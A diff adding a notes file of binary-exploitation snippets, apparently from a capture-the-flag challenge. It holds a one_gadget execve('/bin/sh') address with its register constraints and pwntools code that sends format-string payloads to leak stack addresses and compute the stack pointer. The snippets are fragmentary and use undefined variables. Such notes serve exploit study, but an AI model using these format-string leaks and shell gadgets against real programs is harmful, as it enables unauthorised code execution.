@@ -1,0 +1,50 @@
+0xe3b01 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+
+--------------------------------------------------------------------------------
+
+pl = b'%*21$'	# leak 8 bytes with pointer in stack  
+p.sendline(pl)
+
+leak = p.recvline()
+leak = int(leak[1:-1])
+if hex(leak)[0] == '-':
+	log.critical("Leak Fail!!!")
+	p.close()
+
+rsp = stack4byte + leak - 0x158
+
+log.info('rsp: ' + hex(rsp))
+
+--------------------------------------------------------------------------------
+
+pl = b'%10$c'
+p.sendline(pl)
+
+leak = p.recvline()
+print(leak)
+
+data = str(leak)[4:6]
+if "n'" in data:
+	log.critical("Leak last byte FAIL!!!")
+	p.close()
+print(data)
+print(type(data))
+
+data = int(data, 16)
+log.info("Last byte para 10: " + hex(data))
+data = data - stack_sub
+log.info("Byte start char \"0x0a\": " + hex(data))
+
+----------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
